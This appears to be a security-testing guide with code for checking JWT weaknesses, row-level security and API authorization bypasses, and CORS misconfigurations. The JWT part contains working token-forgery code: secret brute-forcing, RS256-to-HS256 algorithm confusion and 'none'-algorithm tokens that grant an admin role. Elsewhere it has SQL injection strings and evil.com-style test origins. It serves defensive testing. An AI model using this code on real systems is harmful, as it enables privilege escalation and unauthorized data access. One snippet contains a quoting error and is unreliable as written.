## JWT AUTHENTICATION TESTING

### Test 1: JWT Secret Brute Force

**Source:** Extracted from Backend Specialist JWT patterns

**Description:** Testing JWT signature with common/weak secrets.

**Implementation:**

```typescript
// jwt_brute_force.ts
import jwt from 'jsonwebtoken';

async function bruteForceJWTSecret(token: string): Promise<string | null> {
  // Common weak secrets
  const commonSecrets = [
    "secret",
    "password",
    "123456",
    "admin",
    "jwt_secret",
    "your-256-bit-secret",
    "supersecret",
    "change-me",
    "development",
    "test",
    "secretkey",
    "qwerty"
  ];

  // Try each secret
  for (const secret of commonSecrets) {
    try {
      const decoded = jwt.verify(token, secret);
      console.log(`CRITICAL: Weak JWT secret found: "${secret}"`);
      console.log(`Decoded payload:`, decoded);

      return secret;
    } catch (err) {
      // Secret doesn't match, continue
    }
  }

  return null;
}

// Test with captured JWT
const capturedToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
const foundSecret = await bruteForceJWTSecret(capturedToken);

if (foundSecret) {
  // Generate malicious token with elevated privileges
  const maliciousPayload = {
    userId: "user-123",
    email: "attacker@example.com",
    role: "admin"  // Escalated from "user"
  };

  const maliciousToken = jwt.sign(maliciousPayload, foundSecret);

  console.log("Malicious token:", maliciousToken);
}
```

### Test 2: JWT Algorithm Confusion Attack

**Source:** Research-added (JWT security best practices)

```typescript
// jwt_algorithm_confusion.ts
import jwt from 'jsonwebtoken';
import fs from 'fs';

/**
 * Test Algorithm Confusion (RS256 → HS256)
 *
 * If server uses RS256 (asymmetric) but accepts HS256 (symmetric),
 * attacker can use public key as HMAC secret
 */
async function testAlgorithmConfusion(token: string, publicKey: string) {
  // Decode token without verification
  const decoded = jwt.decode(token, { complete: true });

  if (!decoded || decoded.header.alg !== 'RS256') {
    console.log("Token is not RS256");
    return;
  }

  // Create malicious payload
  const maliciousPayload = {
    ...decoded.payload,
    role: "admin"  // Escalate privilege
  };

  // Re-sign with HS256 using PUBLIC key as secret
  const maliciousToken = jwt.sign(
    maliciousPayload,
    publicKey,  // Using PUBLIC key as HMAC secret
    { algorithm: 'HS256' }
  );

  console.log("Malicious HS256 token:", maliciousToken);

  // Test if server accepts it
  const response = await fetch("https://api.example.com/admin/users", {
    headers: {
      "Authorization": `Bearer ${maliciousToken}`
    }
  });

  if (response.ok) {
    console.log("CRITICAL: Algorithm confusion vulnerability!");
    return {
      vulnerability: "JWT Algorithm Confusion (RS256 → HS256)",
      severity: "CRITICAL",
      cvss: 9.8,
      recommendation: "Explicitly validate token algorithm in verification"
    };
  }
}
```

### Test 3: JWT None Algorithm Attack

**Source:** Research-added

```typescript
// jwt_none_algorithm.ts

/**
 * Test 'none' algorithm acceptance
 *
 * Some JWT libraries accept alg: "none" which skips signature verification
 */
function createNoneAlgToken(payload: any): string {
  const header = {
    alg: "none",
    typ: "JWT"
  };

  const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');

  // No signature for "none" algorithm
  return `${encodedHeader}.${encodedPayload}.`;
}

// Test
const maliciousPayload = {
  userId: "admin-id",
  email: "admin@example.com",
  role: "admin",
  exp: Math.floor(Date.now() / 1000) + 3600
};

const noneAlgToken = createNoneAlgToken(maliciousPayload);

// Test if server accepts it
const response = await fetch("https://api.example.com/admin/users", {
  headers: {
    "Authorization": `Bearer ${noneAlgToken}`
  }
});

if (response.ok) {
  console.log("CRITICAL: Server accepts 'none' algorithm!");
  // Vulnerability found
}
```

### Test 4: JWT Expiration Testing

**Source:** Extracted from Backend Specialist JWT patterns

```typescript
// jwt_expiration_test.ts

async function testJWTExpiration() {
  // Step 1: Login and get valid token
  const loginResponse = await fetch("https://api.example.com/auth/login", {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'test@example.com',
      password: 'password123'
    })
  });

  const { accessToken } = await loginResponse.json();

  // Step 2: Wait for token to expire (access tokens should expire in 15 min)
  console.log("Waiting for token expiration (15 minutes)...");
  await new Promise(resolve => setTimeout(resolve, 16 * 60 * 1000));

  // Step 3: Attempt to use expired token
  const testResponse = await fetch("https://api.example.com/api/protected", {
    headers: {
      "Authorization": `Bearer ${accessToken}`
    }
  });

  if (testResponse.ok) {
    return {
      vulnerability: "JWT tokens not expiring",
      severity": "HIGH",
      cvss: 7.5,
      recommendation": "Implement short-lived access tokens (15 min) with refresh tokens"
    };
  }

  console.log("PASS: Expired tokens correctly rejected");
}
```

**Best Practices:**
- ✅ DO: Test for weak JWT secrets
- ✅ DO: Test algorithm confusion (RS256 → HS256)
- ✅ DO: Test 'none' algorithm acceptance
- ✅ DO: Verify token expiration enforcement
- ✅ DO: Test token revocation (logout)
- ✅ DO: Check for sensitive data in JWT payload
- ❌ DON'T: Skip testing refresh token security
- ❌ DON'T: Assume HTTPS protects weak JWT secrets

---

## ACCESS CONTROL TESTING

### Test 1: Row-Level Security (RLS) Bypass

**Source:** Extracted from Backend Specialist RLS patterns

**Description:** Testing PostgreSQL/Supabase RLS policies for bypass vulnerabilities.

**Test Cases:**

#### Test Case 1.1: User-Scoped RLS Bypass

```sql
-- Test if RLS policies can be bypassed

-- Setup: Create two test users
INSERT INTO auth.users (id, email) VALUES
  ('user-a-id', 'usera@example.com'),
  ('user-b-id', 'userb@example.com');

-- Setup: Create test data
INSERT INTO posts (id, user_id, title, content) VALUES
  ('post-1', 'user-a-id', 'User A Post', 'Content A'),
  ('post-2', 'user-b-id', 'User B Post', 'Content B');

-- Test 1: Attempt to query as User A
SET LOCAL role authenticated;
SET LOCAL request.jwt.claims TO '{"sub": "user-a-id"}';

SELECT * FROM posts WHERE id = 'post-2';
-- Expected: 0 rows (User A shouldn't see User B's post)
-- Vulnerability: If returns post-2 = CRITICAL RLS bypass

-- Test 2: Attempt SQL injection to bypass RLS
SELECT * FROM posts WHERE id = 'post-1' OR '1'='1';
-- Expected: Only post-1 returned
-- Vulnerability: If returns all posts = RLS bypass

-- Test 3: Attempt to update another user's post
UPDATE posts SET title = 'Hacked' WHERE id = 'post-2';
-- Expected: 0 rows updated
-- Vulnerability: If updated = CRITICAL

RESET role;
```

#### Test Case 1.2: Team-Based RLS Bypass

```typescript
// test_team_rls.ts
import { createClient } from '@supabase/supabase-js';

async function testTeamRLSBypass() {
  // Setup: User A in Team 1, User B in Team 2
  const userA = createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
  });

  const userB = createClient(SUPABASE_URL, SUPABASE_KEY, {
    auth: { persistSession: false }
  });

  // Login as User A
  await userA.auth.signInWithPassword({
    email: 'usera@example.com',
    password: 'password'
  });

  // User A creates project in Team 1
  const { data: project } = await userA
    .from('projects')
    .insert({
      team_id: 'team-1-id',
      name: 'Team 1 Project'
    })
    .select()
    .single();

  // Login as User B (Team 2)
  await userB.auth.signInWithPassword({
    email: 'userb@example.com',
    password: 'password'
  });

  // Test: User B attempts to access Team 1's project
  const { data: unauthorizedAccess, error } = await userB
    .from('projects')
    .select('*')
    .eq('id', project.id)
    .single();

  if (unauthorizedAccess && !error) {
    console.log("CRITICAL: RLS Bypass - User B accessed Team 1's project!");
    return {
      vulnerability: "RLS Policy Bypass - Team Isolation Failure",
      severity: "CRITICAL",
      cvss: 9.1,
      affected_table: "projects",
      recommendation: "Review and strengthen RLS policies with team_members join"
    };
  }

  // Test: User B attempts to update Team 1's project
  const { error: updateError } = await userB
    .from('projects')
    .update({ name: 'Hacked Project' })
    .eq('id', project.id);

  if (!updateError) {
    console.log("CRITICAL: RLS Bypass - User B updated Team 1's project!");
    return {
      vulnerability: "RLS Policy Bypass - Write Access Violation",
      severity: "CRITICAL",
      cvss: 9.8
    };
  }

  console.log("PASS: RLS policies correctly enforced");
}
```

### Test 2: API Authorization Bypass

**Source:** Extracted from Backend Specialist + Research

```bash
# Test API authorization bypass

# Test 1: Missing Authorization header
curl -X GET "https://api.example.com/api/protected/users"
# Expected: 401 Unauthorized
# Vulnerability: If returns data = CRITICAL

# Test 2: Invalid/malformed token
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer invalid-token"
# Expected: 401 Unauthorized

# Test 3: Expired token
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer $EXPIRED_TOKEN"
# Expected: 401 Unauthorized with "Token expired" message

# Test 4: Token from different application
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: Bearer $TOKEN_FROM_OTHER_APP"
# Expected: 401 Unauthorized

# Test 5: Authorization header in wrong format
curl -X GET "https://api.example.com/api/protected/users" \
  -H "Authorization: $TOKEN_WITHOUT_BEARER"
# Expected: 401 Unauthorized
```

**Automated Script:**

```python
# authorization_bypass_test.py

def test_authorization_bypass(api_url, valid_token):
    """Test various authorization bypass scenarios"""

    test_cases = [
        {
            "name": "No Authorization Header",
            "headers": {},
            "expected_status": 401
        },
        {
            "name": "Invalid Token",
            "headers": {"Authorization": "Bearer invalid-token-12345"},
            "expected_status": 401
        },
        {
            "name": "Malformed Header (No Bearer)",
            "headers": {"Authorization": "token-without-bearer"},
            "expected_status": 401
        },
        {
            "name": "Empty Token",
            "headers": {"Authorization": "Bearer "},
            "expected_status": 401
        },
        {
            "name": "SQL Injection in Token",
            "headers": {"Authorization": "Bearer ' OR '1'='1"},
            "expected_status": 401
        }
    ]

    vulnerabilities = []

    for test in test_cases:
        response = requests.get(
            f"{api_url}/api/protected/users",
            headers=test["headers"]
        )

        if response.status_code != test["expected_status"]:
            vulnerabilities.append({
                "test": test["name"],
                "expected": test["expected_status"],
                "actual": response.status_code,
                "severity": "CRITICAL" if response.status_code == 200 else "HIGH",
                "cvss": 9.8 if response.status_code == 200 else 7.5
            })

    return vulnerabilities
```

**Best Practices:**
- ✅ DO: Test RLS policies with multiple user accounts
- ✅ DO: Test both SELECT and INSERT/UPDATE/DELETE operations
- ✅ DO: Test with SQL injection attempts to bypass RLS
- ✅ DO: Verify API authorization on ALL protected endpoints
- ✅ DO: Test with expired/invalid/missing tokens
- ✅ DO: Test cross-team/cross-user data access
- ❌ DON'T: Trust client-side checks - always test server-side
- ❌ DON'T: Assume RLS works - actively test bypass scenarios

---

## CORS SECURITY TESTING

### Test 1: CORS Misconfiguration Detection

**Source:** Extracted from Backend Specialist CORS patterns

**Description:** Testing for permissive CORS policies that allow unauthorized origins.

**Test Cases:**

#### Test Case 1.1: Wildcard CORS Testing

```bash
# Test for wildcard CORS (Access-Control-Allow-Origin: *)
curl -v -X GET "https://api.example.com/api/data" \
  -H "Origin: https://evil.com"

# Check response headers
# Vulnerability: Access-Control-Allow-Origin: *
# Expected Safe: Access-Control-Allow-Origin: https://trusted-domain.com (or missing)
```

#### Test Case 1.2: Reflected Origin Testing

```bash
# Test if server reflects any Origin header
curl -v -X GET "https://api.example.com/api/data" \
  -H "Origin: https://attacker.com"

# Vulnerable Response:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Safe Response:
# No Access-Control-Allow-Origin header
# OR Access-Control-Allow-Origin: <whitelisted-domain-only>
```

**Automated Script:**

```python
# cors_misconfiguration_test.py

def test_cors_misconfiguration(api_url):
    """Test CORS configuration for security issues"""

    malicious_origins = [
        "https://evil.com",
        "https://attacker.com",
        "http://localhost:3000",
        "null",
        "https://api.example.com.evil.com"  # Subdomain takeover attempt
    ]

    vulnerabilities = []

    for origin in malicious_origins:
        response = requests.get(
            api_url,
            headers={"Origin": origin}
        )

        allowed_origin = response.headers.get('Access-Control-Allow-Origin')
        allow_credentials = response.headers.get('Access-Control-Allow-Credentials')

        # Check for wildcard
        if allowed_origin == '*':
            vulnerabilities.append({
                "vulnerability": "Wildcard CORS",
                "severity": "HIGH",
                "cvss": 7.5,
                "evidence": "Access-Control-Allow-Origin: *",
                "recommendation": "Use explicit origin whitelist"
            })

        # Check for reflected origin
        if allowed_origin == origin:
            severity = "CRITICAL" if allow_credentials == "true" else "HIGH"
            cvss = 9.1 if allow_credentials == "true" else 7.5

            vulnerabilities.append({
                "vulnerability": "CORS Origin Reflection",
                "severity": severity,
                "cvss": cvss,
                "origin": origin,
                "credentials_allowed": allow_credentials,
                "recommendation": "Implement strict origin validation"
            })

        # Check for null origin acceptance
        if origin == "null" and allowed_origin == "null":
            vulnerabilities.append({
                "vulnerability": "Null Origin Accepted",
                "severity": "HIGH",
                "cvss": 7.1,
                "recommendation": "Reject null origin requests"
            })

    return vulnerabilities

# Usage
results = test_cors_misconfiguration("https://api.example.com/api/data")
```

**Best Practices:**
- ✅ DO: Test with multiple malicious origins
- ✅ DO: Check if origin is reflected in response
- ✅ DO: Test null origin acceptance
- ✅ DO: Verify Access-Control-Allow-Credentials is not true with wildcard
- ✅ DO: Test subdomain variations
- ❌ DON'T: Accept wildcard (*) in production APIs
- ❌ DON'T: Reflect arbitrary origins with credentials enabled

---

